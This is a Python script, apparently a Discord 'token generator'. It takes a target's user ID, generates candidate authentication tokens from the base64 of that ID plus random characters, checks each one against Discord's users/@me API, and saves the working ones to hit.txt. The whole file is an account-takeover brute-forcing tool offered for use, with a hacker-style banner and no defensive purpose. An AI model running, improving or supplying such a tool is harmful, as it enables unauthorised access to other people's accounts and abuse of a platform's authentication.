import os
import base64
import time
import random
import string
import requests
from colorama import Fore, init, Style

def print_colored(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")

try:
    import requests
except ImportError:
    print_colored("Installing requests...", "31")
    import subprocess
    subprocess.call(["pip", "install", "requests"])
    print_colored("Requests installed!", "32")

try:
    from colorama import Fore, init, Style
except ImportError:
    print_colored("Installing colorama...", "31")
    import subprocess
    subprocess.call(["pip", "install", "colorama"])
    print_colored("Colorama installed!", "32")

def clear_console():
    os.system("cls")

def encode_base64(input_str):
    return base64.urlsafe_b64encode(input_str.encode()).decode().rstrip("=")

def generate_random_string(k):
    characters = string.ascii_letters + string.digits + "-_"
    return ''.join(random.choice(characters) for _ in range(k))

def get_token(user_id):
    token = f"{encode_base64(user_id)}.{generate_random_string(6)}.{generate_random_string(38)}"
    return token

def check_token_validity(token):
    headers = {
        'Authorization': token,
    }
    try:
        login = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
        if login.status_code == 200:
            print(f"{Fore.GREEN}[+] VALID {token}{Fore.RESET}")
            with open('hit.txt', "a+") as f:
                f.write(f'{token}\n')
        else:
            print(f"{Fore.RED}[-] INVALID {token}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] ERROR OCCURRED {token}")
        print(f"Error details: {e}")

def print_banner():
    banner = (Fore.MAGENTA + """
██   ██ ███████ ██████  ███    ███ ██ ███████ 
██   ██ ██      ██   ██ ████  ████ ██ ██      
███████ █████   ██████  ██ ████ ██ ██ ███████ 
██   ██ ██      ██   ██ ██  ██  ██ ██      ██ 
██   ██ ███████ ██   ██ ██      ██ ██ ███████ 
                                              
    """ + Fore.LIGHTCYAN_EX)
    print(banner)

def main():
    init()
    clear_console()
    print_banner()
    print(f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    Dev:{Style.RESET_ALL} {Fore.MAGENTA}Hermis{Fore.WHITE} <3")
    time.sleep(3)
    clear_console()

    # Input validation
    while True:
     try:
        num_tokens_to_generate = int(input(
            f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    HOW MANY TOKENS  : {Fore.MAGENTA}"))
        user_id = input(
            f"{Fore.MAGENTA}[$]{Style.RESET_ALL}    USER ID  : {Fore.MAGENTA}")

        if not user_id.isdigit():
            raise ValueError
        break

     except ValueError:
        print(f"{Fore.RED}Please enter a valid number.{Fore.RESET}")

    clear_console()

    for _ in range(num_tokens_to_generate):
        token = get_token(user_id)
        check_token_validity(token)

    time.sleep(1.5)
    clear_console()
    print_banner()
    print(f"{Fore.CYAN}[$]{Style.RESET_ALL}    Finished generating\n{Fore.CYAN}[$]{Style.RESET_ALL}    Press Enter to exit..")
    input()

if __name__ == "__main__":
    main()
